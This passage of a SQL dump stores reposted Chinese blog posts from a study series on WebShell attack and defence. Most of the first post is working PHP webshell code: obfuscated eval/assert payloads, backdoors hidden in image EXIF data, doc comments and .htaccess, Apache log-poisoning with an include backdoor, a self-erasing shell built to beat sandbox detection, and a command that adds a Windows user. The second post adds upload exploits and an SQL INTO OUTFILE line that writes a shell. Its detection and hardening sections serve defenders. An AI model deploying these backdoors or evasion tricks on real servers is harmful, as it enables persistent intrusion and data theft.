函数在数组中根据条件取出一段值，并返回。\nhttp://www.w3school.com.cn/php/func_string_implode.asp\nimplode\n这个webshell通过编码的referer来传递攻击载荷，HTTP通信的头部的任何字段、或者HTTP的数据部分的任何字段都可以当作webshell的payload来传递数据的。</pre>\n<pre class=\"brush: php; gutter: true\">0x22: 乱序拼接法\n&lt;?php  \n    @$_=&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;;  \n    @$_=&quot;a&quot;.$_.&quot;t&quot;;  \n    @$_(${&quot;_P&quot;.&quot;OS&quot;.&quot;T&quot;}[1-2-5]);\n?&gt;  \n注意这里双层${}的作用，里面那个${}是为了让_POST[-6]被解析出来的，如果不用这个花括号，则这个&quot;_POST[]&quot;就变成一个纯文本了，加上这个${}之后，变量原本的变量特性就表现出来了，\n也就能正确传参了\n&lt;?php\n    $aaaaa=&quot;sewtemznypianol&quot;;\n    $char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};\n    //die($char_system);\n    $aaaaaa=&quot;edoced46esab_n&quot;;\n    $char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$aaaaaa{3}.\n　　　$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};\n    die($char_base64_decode);\n    echo $char_system($char_base64_decode(&quot;aXBjb25maWc=&quot;));\n?&gt;\n这种webshell的编写思路很巧妙，和&quot;乱序插入&quot;还不是一个做法\n1) &quot;乱序插入&quot;是在一段正常的webshell代码中随机插入一些杂乱的无意义的字母，然后再在下面使用preg_replace之类的正则替换来去除掉这些&quot;混淆盐字母&quot;，以还原出原有的正常的\n　　webshell代码\n2) 这种做法是先定义一个&quot;字母池&quot;，这个&quot;字母池&quot;包含有我们需要构造的关键函数的字符。我们通过从这个字母池中选取特定的索引下的字母，以此来构造出我们想要\n　　的&quot;动态函数&quot;(system、base64_decode)</pre>\n<pre class=\"brush: php; gutter: true\">0x23: 利用apache的错误日志进行webshell的注入\n利用了apche服务器的错误日志文件，当访问一个不存在的连接时,日志中会记录下这样的一句话\n[Tue Jan 14 09:48:01.664731 2014] [core:error] [pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: \n[client ::1:10248] AH00127: Cannot map GET /shell/&lt;?php eval($_POST[sb])?&gt; HTTP/1.1 to file\n这个和很多CMS中的功能很类似，会记录一些运行信息\n    1) 出错信息，包含导致出错的原始语句，问题也就发生在这里，即用户可能有机会控制这个日志文件的内容\n    2) 访问记录(例如: 请求URL)，和(1)同样的道理，这属于用户可控的信息\n    3) 其他的HTTP相关信息\n后门back door: 这是留待以后用来引入带后门的日志文件使用的\n&lt;?php\n    include($_GET[&#039;f&#039;]);  \n?&gt;\n攻击触发脚本，向日志文件中打入payload\nhttp://localhost/shell/attack.php\n&lt;?php  \n    // 1. 初始化  \n    $ch = curl_init();  \n    // 2. 设置选项，包括URL  \n    curl_setopt($ch, CURLOPT_URL, &quot;http://localhost/shell/&lt;?php eval(\\$_POST[sb])?&gt;&quot;);  \n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);  \n    curl_setopt($ch, CURLOPT_HEADER, 0);  \n    curl_setopt($ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/4&quot;);  \n    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);  \n    // 3. 执行并获取HTML文档内容  \n    $output = curl_exec($ch);  \n    // 4. 释放curl句柄  \n    curl_close($ch);  \n?&gt;  \n执行这个脚本后，会在apache的错误日志中留下原始的访问记录\n[Tue Jan 14 09:48:01.664731 2014] [core:error] [pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: \n[client ::1:10248] AH00127: Cannot map GET /shell/&lt;?php eval($_POST[sb])?&gt; HTTP/1.1 to file\n之后吧log的地址当做参数传入即可，这里log位置须自行查找\nhttp://localhost/shell/index.php?f=E:\\wamp\\logs\\apache_error.log</pre>\n<pre class=\"brush: php; gutter: true\">0x24: 利用字符的运算符来进行webshell的构造\n&lt;?php\n    echo &#039;a&#039;|&#039;d&#039;;//e!  \n?&gt;\n字符串和数字的强转:\n&lt;?php  \n    $_=&quot;abc&quot;;\n    echo $_+1;  //1\n?&gt;\n&lt;?php  \n    $_=&quot;1abc&quot;;\n    echo $_+1;  //2\n?&gt;\n字符串会被强制转换成数字，如果不能转，就返回0\nhttp://www.blogjava.net/zuofei-bie/archive/2010/03/31/317092.html\n&lt;?php  \n    $_=&quot;abc&quot;;  \n    echo ++$_;  //abd  \n?&gt;\n这种&quot;++&quot;和&quot;+&quot;的表现形式还不太一样，&quot;++&quot;是把字符串最后一个字母进行&quot;+1&quot;</pre>\n<pre class=\"brush: php; gutter: true\">0x25: 使用PHP的管道技术执行系统命令后门\npopen()\nhttp://www.w3school.com.cn/php/func_filesystem_popen.asp\n&lt;?php\n    /*\n        PHP中如何增加一个系统用户\n        下面是一段例程，\n        用户名: test\n        密码是: 111\n    */\n    $command = &quot;net user&quot;;\n    $useradd = &quot;add &quot;;\n    $pwd = &quot;111&quot;;\n    $user = &quot;test&quot;;  \n    $user_add = sprintf(&quot;%s &quot;%s %s&quot;&quot;, $command, $useradd, $user, $pwd);\n    $fp = @popen($user_add,&quot;w&quot;);  \n    @pclose($fp);\n?&gt;\n命令执行成功，添加账户成功。PHP执行命令有很多方法，eval、passthru、system、assert、popen、exec、shell_exec</pre>\n<pre class=\"brush: php; gutter: true\">0x26: 利用PHP的指令替换编写webshell\n&lt;?php   \n    $cmd = `dir`;  \n    echo $cmd;   \n?&gt;  \n波浪线下面那个键括起来的字符串可以当命令执行。</pre>\n<pre class=\"brush: php; gutter: true\">0x27: 利用一些CMS等开源框架进行本地变量覆盖\n&lt;?php\n    foreach ($_GET as $key =&gt; $value)\n    {\n        $result .= &quot;$key=$value&amp;&quot;;\n    }\n    /*\n        很多开源框架都有类似上面这段功能的代码，用于将用户输入的参数进行批量的本地化\n        但是这也往往导致了&quot;本地变量覆盖漏洞&quot;\n        同时也可以被黑客用来在原本正常的文件中插入\n            parse_str($result);\n            $sys($command);\n        这段代码来进行getshell\n    */\n    ..\n    parse_str($result);\n    $sys($command);\n?&gt;\nhttp://localhost/shell/index.php?sys=system&amp;command=dir</pre>\n<pre class=\"brush: php; gutter: true\">0x28: PHP图片木马\n除了传统的把php代码type进图片不一样，这里介绍另一种图片木马的利用方式。\n图片木马相关知识\nhttp://en.wikipedia.org/wiki/Exchangeable_image_file_format\nhttp://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html\nMalware Hidden Inside JPG EXIF Headers  \nhttp://cn2.php.net/manual/zh/function.exif-read-data.php\nexif_read_data\nexif_read_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据\n&lt;?php\n    echo &quot;img.jpg:&lt;br /&gt;\\n&quot;;\n    $exif = exif_read_data(&#039;img.jpg&#039;, &#039;IFD0&#039;);\n    //IFD0     所有 IFD0 的标记数据。在标准的图像文件中这包含了图像大小及其它。\n    echo $exif===false ? &quot;No header data found.&lt;br /&gt;&quot; : &quot;Image contains headers&lt;br /&gt;&quot;;\n    echo &quot;&lt;br /&gt;&quot;;\n    //FILE    FileName, FileSize, FileDateTime, SectionsFound\n    $exif = exif_read_data(&#039;img.jpg&#039;, &#039;FILE&#039;, true);\n    echo &quot;img.jpg:&lt;br /&gt;\\n&quot;;\n    foreach ($exif as $key =&gt; $section)\n    {\n        foreach ($section as $name =&gt; $val)\n        {\n            echo &quot;$key.$name: $val&lt;br /&gt;\\n&quot;;\n        }\n        echo &quot;&lt;br /&gt;&quot;;\n    }\n?&gt;\n这里提出了一种隐藏webshell的新思路\n1. 和传统的图片木马不一样，传统的图片木马就是简单的利用type命令把webshell代码接在一个正常的图片尾部，然后在另一个脚本中使用include包含进来，PHP解析解析引擎会忽略在\n　　PHP看来毫无意义的图片数据的乱码，而去执行在文件结尾的PHP代码，这是一种很好的利用方式\n2. 而关于这种图片木马，可以有一种更加精确的利用方式，图片(也就是EXIT格式的文件)的每个区段都是有精确意义的，我们可以将我们的webshell准确地放置在这些指定的区域，\n　　然后使用exif_read_data去读取读取出来，然后使用preg_replace的&quot;e&quot;开关去动态执行，或者使用动态函数去动态执行\n3. 这个可以用来规避include那种类型的黑名单检测\n将webshell代码放置在EXIT的头部区域中，这里挑选:\nIFD0-&gt;\n1. ImageDescription: /.*/e\n2. Subject: eval(\\$_POST[1])\n(注意这里要使用winhex来进行ASCII字符的修改)\n&lt;?php  \n    //FILE    FileName, FileSize, FileDateTime, SectionsFound\n    $exif = exif_read_data(&#039;img.jpg&#039;, &#039;FILE&#039;, true);\n    var_dump($exif[&#039;IFD0&#039;][&#039;ImageDescription&#039;]);\n    var_dump($exif[&#039;IFD0&#039;][&#039;Subject&#039;]);\n    preg_replace($exif[&#039;IFD0&#039;][&#039;ImageDescription&#039;], $exif[&#039;IFD0&#039;][&#039;Subject&#039;],&#039;&#039;);\n    //die();\n?&gt;</pre>\n<pre class=\"brush: php; gutter: true\">: 将数据放在注释中\nttp://www.8090sec.com/suixinbiji/111568.html\n黑客将webshell放到了/**/注释中，然后利用类的反射机制获取到，进行动态函数的执行\nPHP的反射类机制\nReflectionClass\nhttp://cn2.php.net/manual/zh/reflectionclass.construct.php\nReflectionClass::getDocComment — 获取文档注释\nhttp://cn2.php.net/manual/zh/reflectionclass.getdoccomment.php\n这是最终的poc\n&lt;?php  \n    /**   \n    * eval($_POST[1]);\n    */  \n    class TestClass { }  \n    $rc = new ReflectionClass(&#039;TestClass&#039;);  \n    //获取当前文档的注释\n    $comment = $rc-&gt;getDocComment();\n    //die(var_dump($comment));\n    $pos = strpos($comment,&#039;eval&#039;);\n    //die(var_dump($pos));  \n    $eval=substr($comment,$pos,16);  \n    //die($eval);\n    eval($eval);\n?&gt;</pre>\n<pre class=\"brush: php; gutter: true\">： .htaccess后门\n可将php代码存于非php后缀文件,例: x.jpg\n将以下代码写入.htaccess中\nSetHandler application/x-httpd-php\n连接x.jpg即可启动后门木马\nhttp://26836659.blogcn.com/articles/利用-htaccess文件来执行php脚本.html\n将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马\nphp_value auto_append_file E:/wamp/www/choop.php</pre>\n<pre class=\"brush: php; gutter: true\">: webshell多态技术: 自毁型webshell\n自毁性WebShell\n&lt;?php\n    /*\n        现在的PHP的webshell的检测基本用的是对PHP执行引擎进行hook进行动态检测\n        即我们构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断\n        而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数&quot;code&quot;，就会导致毁灭性覆写&quot;fwrite ($fp, $content)&quot;的结果\n        这样，沙箱的执行结果就是一个普通的文本&quot;helloworld&quot;\n        然后，管理员再去查看这个文件的时候，看到的就只是一个&quot;helloworld&quot;了\n        这个是很针对&quot;PHP的动态沙箱检测&quot;的绕过的\n        反而利用了沙箱的机制，沙箱导致了文件的毁坏\n    */\n    //$url = $_SERVER[&#039;PHP_SELF&#039;];\n    //$filename = end(explode(&#039;/&#039;,$url));\n    //die($filename);\n    if($_REQUEST[&quot;code&quot;]==pany)\n    {\n        echo str_rot13(&#039;riny($_CBFG[pzq]);&#039;);\n        eval(str_rot13(&#039;riny($_CBFG[pzq]);&#039;));\n    }\n    else\n    {\n        $url = $_SERVER[&#039;PHP_SELF&#039;];\n        $filename = end(explode(&#039;/&#039;,$url));\n        $content = &#039;helloworld&#039;;\n        $fp = fopen (&quot;$filename&quot;,&quot;w&quot;);\n        if (fwrite ($fp, $content))\n        {\n            fclose ($fp);\n            die (&quot;error&quot;);\n        }\n        else\n        {\n            fclose ($fp);\n            die (&quot;good&quot;);\n        }\n        exit;\n    }\n?&gt;</pre>\n<pre class=\"brush: php; gutter: true\">: 利用本地变量注册技术\nhttp://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html\n利用extract函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行\nhttp://www.php.net/manual/en/function.extract.php\n&lt;?php\n    @extract ($_REQUEST);\n    @die($ctime($atime));\n?&gt;\nhttp://localhost/test/index.php?ctime=assert&amp;atime=phpinfo()</pre>\n<pre class=\"brush: php; gutter: true\">: 关于本地变量注册技术的利用姿势\nPHP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造\n1) extract\n2) parse_str\n3) foreach(..) { $$key = $value; }\n这三种在本文中都给出了相应例子</pre>\n<pre class=\"brush: php; gutter: true\">: 利用PHP的逻辑运算符进行WEBSHELL的编码\nhttp://worm.cc/PHP中使用按位取反函数创建后门.html\nWEBSHELL代码\n&lt;?php\n    $x = ~&quot;žŒŒš‹&quot;;\n    $y = ~&quot;—–‘™×Ö&quot;;\n    $x($y);\n?&gt;\n生成原理\n&lt;?php\n    echo ~&quot;assert&quot;;\n    echo ~&quot;phpinfo()&quot;;\n?&gt;\n注意这个文件一定要保存为ANSI格式</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/31.png\"><img class=\"alignnone size-medium wp-image-732\" title=\"3\" src=\"http://javaweb.org/wp-content/uploads/2014/02/31-300x96.png\" alt=\"\" width=\"300\" height=\"96\" /></a></p>\n<pre>这是一种利用数学运算符来进行WEBSHELL隐藏的一个思路，举一反三，还可以使用其他的数学运算符来进行相似的隐藏效果</pre>\n<pre class=\"brush: php; gutter: true\">: 利用PHP扩展隐藏后门WEBSHELL木马\n这种情况需要黑客已经对目标服务器具有一定的控制权，可以修改目标服务器的php.ini并且可以上传扩展文件.so、.dll到指定目录下。这种扩展型的后门木马的效果非常好，\n对静态检测程序、和动态沙箱检测程序的bypass特性都有很好的\n表现。技术上说，这种利用PHP扩展隐藏后门的方法还有分为两种\n　　1) 编写扩展程序，Hook某些核心的PHP函数的执行流，并通过检测网络流量中是否出现指定的关键字(例如攻击者可以指定pwd:作为命令的触发标识)来决定是启动后门程序，并执行指令\n　　2) 编写扩展程序，生成一些新的函数(例如backdoor_eval())，这样，黑客就可以在自己的WEBSHELL.PHP中调用这种函数，从而躲避静态检测程序的检测\nhttp://www.kissthink.com/archive/3482.html</pre>\n<p>3. webshell变种后门生成工具介绍</p>\n<p>webshell的自动化生成和混淆工具目前已经有很多不错的工具可用了</p>\n<pre>1. webacoo\nhttps://github.com/anestisb/WeBaCoo/\n2. weevely\nhttps://github.com/epinna/weevely/\n3. Hookworm\nhttps://github.com/modcloth-labs/hookworm\n4. hidemyphpshell.py\nhttp://hackeruna.com/2011/09/06/hidemyphpshell-ofuscador-de-codigo-php/</pre>\n<pre>这几款工具，都有简单易用的命令行界面，可以方便地生成webshell</pre>\n<strong>4. webshell的检测技术</strong>\n这块内容目前刚开始接触，还有待深入学习，应该在之后的学习笔记中会继续研究\n目前webshell的检测主要分为静态检测和动态检测。\n<pre>静态检测主要是基于以下几点:\n1) 基于正则的特征匹配: webshell常常表现出一些有别于正常业务代码的特征\n典型的代表: LMD (Linux Malware Detect) scanner\nhttp://www.clamav.net/lang/en/\n2) 基于文本的统计特征的阈值分析: webshell由于往往经过了编码和加密，会表现出一些特别的统计特征\n典型的代表: NeoPI -- https://github.com/Neohapsis/NeoPI\n3) 基于文件间&quot;关联性&quot;的分析: webshell一般和原始目录下的其他正常文件关联性较低</pre>\n<pre>动态检测主要是基于以下几点:\n1) 编写PHP扩展，对关键函数的执行进行HOOK，例如system等函数，这样，就可以创造出一个PHP的执行沙箱，进行虚拟机检测\n2) 进行磁盘文件系统的实时监控，getshell的过程一定会涉及到磁盘的读写，利用windows提供的API:\nhttp://msdn.microsoft.com/en-us/library/windows/desktop/ms687025(v=vs.85).aspx\nWaitForMultipleObjects function\nhttp://msdn.microsoft.com/en-us/library/windows/desktop/aa365465(v=vs.85).aspx\nReadDirectoryChangesW function\n可以实现对磁盘操作的实时监控，对可疑的webshell创建进行分析、检测、拦截</pre>\n<p>本周主要关注webshell的常见写法以及变形技术，接下来将继续研究一下webshell的检测技术，并尝试写出demo</p>\n<p><div id=\"MySignature\">只要还有梦，心就能飞翔</div></p>', null, '2014-02-24 10:14:17', '1', '603', null, '0', '2014-03-11 17:55:40');
INSERT INTO `sys_posts` VALUES ('740', '5', '14', '[cnblogs-.Little Hann]WebShell攻防对抗小结(2) -- WebShell攻防对抗系列学习', 'Anonymous', 'FROM:<a href=\"http://www.cnblogs.com/LittleHann/p/3558685.html\">WebShell攻防对抗小结(2) -- WebShell攻防对抗系列学习</a>\n<p>作为WebShell检测、CMS修复、WebShell攻防研究学习的第二篇文章</p>\n<p>本文旨在研究Webshell的生成原因、WebShell和服务器安全的关系、针对WebShell生成的文件磁盘操作的行为检测。希望能给研究这一领域的朋友带来一点点帮助，同时抛砖引玉，和大家共同讨论更多的技术细节， 共同学习成长</p>\n<p>上一篇文章中我们学习了WebShell的一些猥琐的编写方式，并分享了一些WebShell的生成工具和检测工具</p>\n<p>http://www.cnblogs.com/LittleHann/p/3522990.html</p>\n<pre class=\"brush: php; gutter: true\">文章主要分为3个部分:\n1. WebShell的产生原因、以及常见的WebShell隐藏手段\n2. WebShell的对抗方法\n3. 文件磁盘的行为监控在WebShell对抗中的应用</pre>\n<p>相关学习资料</p>\n<p><a title=\"http://safe.it168.com/a2012/0619/1362/000001362350.shtml\" href=\"http://safe.it168.com/a2012/0619/1362/000001362350.shtml\" target=\"_blank\">http://safe.it168.com/a2012/0619/1362/000001362350.shtml</a></p>\n<p><a title=\"http://blog.sucuri.net/2013/08/open-source-backdoor-copyrighted-under-gnu-gpl.html\" href=\"http://blog.sucuri.net/2013/08/open-source-backdoor-copyrighted-under-gnu-gpl.html\" target=\"_blank\">http://blog.sucuri.net/2013/08/open-source-backdoor-copyrighted-under-gnu-gpl.html</a></p>\n<p><a title=\"http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html\" href=\"http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html\" target=\"_blank\">http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html</a></p>\n<p><a title=\"http://blog.sucuri.net/2013/10/backdoor-evasion-using-encrypted-content.html\" href=\"http://blog.sucuri.net/2013/10/backdoor-evasion-using-encrypted-content.html\" target=\"_blank\">http://blog.sucuri.net/2013/10/backdoor-evasion-using-encrypted-content.html</a></p>\n<p><a title=\"http://www.oschina.net/p/falcon/similar_projects?lang=19&amp;sort=time&amp;p=4\" href=\"http://www.oschina.net/p/falcon/similar_projects?lang=19&amp;sort=time&amp;p=4\" target=\"_blank\">http://www.oschina.net/p/falcon/similar_projects?lang=19&amp;sort=time&amp;p=4</a></p>\n<p><a title=\"http://www.oschina.net/p/inotify-tools\" href=\"http://www.oschina.net/p/inotify-tools\" target=\"_blank\">http://www.oschina.net/p/inotify-tools</a></p>\n<p><a title=\"http://www.freebuf.com/articles/web/11878.html\" href=\"http://www.freebuf.com/articles/web/11878.html\" target=\"_blank\">http://www.freebuf.com/articles/web/11878.html</a></p>\n<p><a title=\"http://sec.chinabyte.com/35/12736535.shtml\" href=\"http://sec.chinabyte.com/35/12736535.shtml\" target=\"_blank\">http://sec.chinabyte.com/35/12736535.shtml</a></p>\n<p><a title=\"http://www.oschina.net/p/snare\" href=\"http://www.oschina.net/p/snare\" target=\"_blank\">http://www.oschina.net/p/snare</a></p>\n<p><a title=\"http://docs.trendmicro.com/all/smb/wfbs-services/Client/wfbs-svc/v3.7/zh-CN/ClientHelp/About_Behavior_Monitoring.htm\" href=\"http://docs.trendmicro.com/all/smb/wfbs-services/Client/wfbs-svc/v3.7/zh-CN/ClientHelp/About_Behavior_Monitoring.htm\" target=\"_blank\">http://docs.trendmicro.com/all/smb/wfbs-services/Client/wfbs-svc/v3.7/zh-CN/ClientHelp/About_Behavior_Monitoring.htm</a></p>\n<p><a title=\"http://www.jiayf.com/tech/1078.html \" href=\"http://www.jiayf.com/tech/1078.html%20\" target=\"_blank\">http://www.jiayf.com/tech/1078.html </a></p>\n<p><a title=\"http://www.360doc.com/content/11/0415/15/2630460_109844571.shtml\" href=\"http://www.360doc.com/content/11/0415/15/2630460_109844571.shtml\" target=\"_blank\">http://www.360doc.com/content/11/0415/15/2630460_109844571.shtml</a></p>\n<p><a title=\"http://www.freebuf.com/articles/web/23358.html\" href=\"http://www.freebuf.com/articles/web/23358.html\" target=\"_blank\">http://www.freebuf.com/articles/web/23358.html</a></p>\n<p><a title=\"https://github.com/emposha/PHP-Shell-Detector\" href=\"https://github.com/emposha/PHP-Shell-Detector\" target=\"_blank\">https://github.com/emposha/PHP-Shell-Detector</a></p>\n<p><a title=\"http://www.freebuf.com/tools/3939.html\" href=\"http://www.freebuf.com/tools/3939.html\" target=\"_blank\">http://www.freebuf.com/tools/3939.html</a></p>\n<p><a title=\"http://www.google.com/patents/CN103294952A?cl=en\" href=\"http://www.google.com/patents/CN103294952A?cl=en\" target=\"_blank\">http://www.google.com/patents/CN103294952A?cl=en</a></p>\n<p><a title=\"http://www.91ri.org/2440.html\" href=\"http://www.91ri.org/2440.html\" target=\"_blank\">http://www.91ri.org/2440.html</a></p>\n<p><a title=\"http://resources.infosecinstitute.com/web-shell-detection/\" href=\"http://resources.infosecinstitute.com/web-shell-detection/\" target=\"_blank\">http://resources.infosecinstitute.com/web-shell-detection/</a></p>\n<p><a title=\"https://bechtsoudis.com/hacking/detect-protect-from-php-backdoor-shells\" href=\"https://bechtsoudis.com/hacking/detect-protect-from-php-backdoor-shells\" target=\"_blank\">https://bechtsoudis.com/hacking/detect-protect-from-php-backdoor-shells</a></p>\n<p>1. WebShell的产生原因、以及常见的WebShell隐藏手段</p>\n<p>我们在上一篇文章中学习了常见webshell的各种形式</p>\n<p><a title=\"http://www.cnblogs.com/LittleHann/p/3522990.html\" href=\"http://www.cnblogs.com/LittleHann/p/3522990.html\" target=\"_blank\">http://www.cnblogs.com/LittleHann/p/3522990.html</a></p>\n<p>webshell是往往是黑客通过web漏洞、FTP漏洞、WEB容器(IIS、Apache)等漏洞入侵了目标服务器，并在其WEB目录放置了后门的可执行脚本，用于下次继续入侵准备的。我总结了webshell的生成主要和一下几个方面的漏洞导致的，我们在对webshell攻防、服务器加固安全的时候也可以从这个角度去思考</p>\n<pre class=\"brush: php; gutter: true\">1. Web软件开发的安全\n    1) 程序中存在文件上载的漏洞，攻击者利用漏洞上载木马程序文件\n        1.1) FCK文件上传漏洞，攻击者直接上传webshell，前提是这个网站允许上传类型为.php、.asp、.php.rar的文件，或者黑客通过其他的方式(例如XSS)恶意修改了允许上传文件\n　　　　　　　　扩展的设置\n        　　　　http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html\n        　　　　http://localhost/fckeditor/editor/filemanager/upload/test.html\n        　　　　http://localhost/fckeditor/editor/filemanager/connectors/test.html\n        　　　　http://localhost/fckeditor/editor/filemanager/connectors/uploadtest.html \n        1.2) FCK任意目录生成漏洞，攻击者生成/xx.asp/目录，然后再往这个目录下上传任意扩展后缀的文件，这些任意扩展后缀的文件都会被当作.asp来进行执行\n        http://localhost/fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp\n　　　　　　　　&amp;NewFolderName=z&amp;uuid=1244789975684\n        　　(这个指令可以在images文件夹下建立/shell.asp/文件夹)\n    2) 后台数据库备份及恢复代码逻辑存在漏洞\n        2.1) 利用后台对access数据库的&quot;备份数据库&quot;或&quot;恢复数据库&quot;功能，&quot;备份的数据库路径&quot;等变量没有过滤导致可以把任意文件后缀改为asp，从而得到WebShell\n        (大概利用方式如下:)\n            2.1.1) 我们将一个webshell的.php文件修改后缀，改成目标网站允许上传的文件扩展类型(例如.rar)\n            2.1.2) 将这个shell.rar(包含webshell代码的文件)文件上传到网站附件文件夹中(例如\\uploads\\)\n            2.1.3) 利用网站后台的数据库备份功能，这里一般情况下程序会让我们输入源文件路径，以及目标文件路径(程序错误的信任了用户输入的源路径就是有效路径，造成信任边界问题)\n            2.1.4) 我们在备份文件的源路径填写我们刚才上传的shell.rar，然后在目标文件路径填写\\www\\shell.php、或者\\www\\shell.asp\n            2.1.5) 备份的过程本质上是文件复制，完成复制后，我们上传的webshell就得以执行了\n    2) 防sql注入\n        2.1) 攻击者通过SQL注入获取后台管理员的帐号和密码，进入后台后\n            2.1.1) 利用网站后台的SQL执行功能进行getshell(DEDE、Discuz等CMS的后台可以执行包括写磁盘在内的任意SQL命令)\n            select &quot;&lt;?php eval($POST[&#039;op&#039;]); ?&gt;&quot; into outfile &quot;c:\\\\wamp\\\\www\\\\shell.php&quot;;\n            2.1.2) 利用后台的水印、头像、表情上传功能获取webshell。(要注意的是，大多数网站基本不允许上传.php、.asp后缀的文件。我们可以利用apache的解析漏洞\n　　　　　　　　　　　　上传xx.php.rar这样的文件是shell得以执行。或者手动在后台开启.php、.asp的文件扩展上传设置)\n            2.1.3) 在后台修改&quot;允许上传的附件扩展类型&quot;。(这是一种逻辑后门的思路，我们可以设置一种比较少见的扩展，例如，添加.cdx扩展，这样可以保持一定的隐蔽性，\n　　　　　　　　　　　　同时让黑客能够顺利上传webshell)\n    3) 防暴库\n        3.1) 黑客通过爆库获得了网站后台的帐号和密码\n        3.2) 黑客通过爆库直接获取了目标网站数据库的连接帐号和连接密码，直接进入数据库:\n            3.2.1) 数据库rootkit: 数据后门触发器、数据库后门UDF等\n            3.2.2) 利用phpmyadmin进行getshell\n            3.2.3) 在数据库的某些表中方式&quot;自动生成的webshell payload&quot;: 例如一些CMS的动态模版语言，当访问这些模版的时候，就会从数据库中提取我们的webshell payload，\n　　　　　　　　　　进而进行写磁盘getshell\n            　　　　http://www.i0day.com/1403.html\n            　　　　http://ha.cker.in/1006.seo\n            　　　　(在数据库的dede_mytag表中留下后门webshell payload，每次访问mytag_js.php的时候就会自动在\\plus\\目录下生成webshell文件)\n    4) 防COOKIES欺骗\n        4.1) 利用XSS漏洞获取管理员的帐号和密码\n        4.2) XSS+GETSHEL，基于XSS的webshell也是一种webshell的形式，只是这种webshell的服务端在&quot;受害者的浏览器&quot;上\n        http://www.exploit-db.com/vbseo-from-xss-to-reverse-php-shell/\n    5) 防跨站脚本攻击。\n2. 服务器的安全和web服务器的安全\n    1) 服务器做好各项安全设置，安装WAF、流量分析IDS\n　　　　(例如ModSecurity可以对HTTP流量进行恶意检测，方式webshell的打入、以及即使webshell已经存在了还可以阻止webshell的执行)\n    　　http://www.freebuf.com/articles/web/18084.html\n    2) 提升web服务器的安全设置\n        2.1) WEBDEV可写，黑客可以利用iisput等工具上传webshell文件\n        2.2) 文件系统的ACL控制，对web目录的账户读写权限进行严格控制\n        http://www.e7xue.com/thread-28168-1-1.html\n    3) 对以下命令进行权限控制(以windows为例)\n        3.1) cmd.exe \n        3.2) net.exe \n        3.3) net1.exe \n        3.4) ping.exe \n        3.5) netstat.exe \n        3.6) ftp.exe \n        3.7) tftp.exe \n        3.8) telnet.exe\n    (安全狗的一个很重要的功能就是对这些关键的命令(程序)进行限制和监控)\n3. ftp文件上载安全\n    1) FTP匿名访问: 设置好ftp服务器，防止攻击者直接使用FTP上传木马程序文件到web程序的目录中\n    2) FTP弱口令破解: 黑客利用FTP的弱口令进行字典破解，上传webshell\n4. 文件系统的存储权限\n    1) 设置好web程序目录及系统其它目录的权限，相关目录的写权限只赋予给超级用户，部分目录写权限赋予给系统用户\n    2) 不要使用root权限去运行mysql、apache等服务器。而使用特殊配置过的指定账户来运行这些web容器软件\n5. 不要使用超级用户运行web服务\n    1) 对于apache、tomcat等web服务器，安装后要以系统用户或指定权限的用户运行，如果系统中被植入了asp、php、jsp等木马程序文件，以超级用户身份运行，webshell提权后\n　　　　获得超级用户的权限进而控制整个系统和计算机</pre>\n<p>以上总结了我所遇到的WEB攻击方式，这些攻击方式适用于不同的攻击场景，并且往往不是单独存在的，即它们往往会互相成为前提条件，一个漏洞的产生为另一个漏洞的触发提供了基本条件。</p>\n<p>了解了WEBSHELL的入侵方式，我们接下来学习一下webshell的隐藏技巧，黑客在入侵了一台主机之后，会在这台主机上留下不止一个webshell，并尽可能地散步在不同的目录下，即使管理员通过发现了其中的一部分webshell并予以删除，只要服务器上还存在一个隐藏的很深的webshell，黑客就可以利用这个webshell进行再次入侵。</p>\n<pre class=\"brush: php; gutter: true\">webshell的隐藏、伪装技巧\n1. 改默认密码\n2. 改名，融入上传后所在的文件夹，将名字改得较为&quot;普通&quot;(例如indexi.php)，让人很难直观地看出文件的异常。\n3. 文件大小的伪装处理(像正常脚本)\n4. 将webshell的payload代码插入到网站原本的正常.php文件中(插入法)，普通的正则匹配很难发现这种webshell\n5. webshell文件混淆:\n    1) 变量名混淆\n    2) 插入大量无用的随机字符串\n6. 变形\n    1) 仿照一些标准、正常的文件名。例如在Joomla的目录下放置LICESNE.php这种&quot;不容易引起视觉可疑&quot;的文件名，并且这些文件的内容都极其类似正常的LICENCE文件\n    http://blog.sucuri.net/2013/08/more-creative-backdoors-using-filename-typos.html\n    http://blog.sucuri.net/2013/08/open-source-backdoor-copyrighted-under-gnu-gpl.html\n    &lt;?php\n    /*            GNU GENERAL PUBLIC LICENSE\n    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n    ..\n    GNU GENERAL PUBLIC LICENSE\n    Version 2, June 1991\n    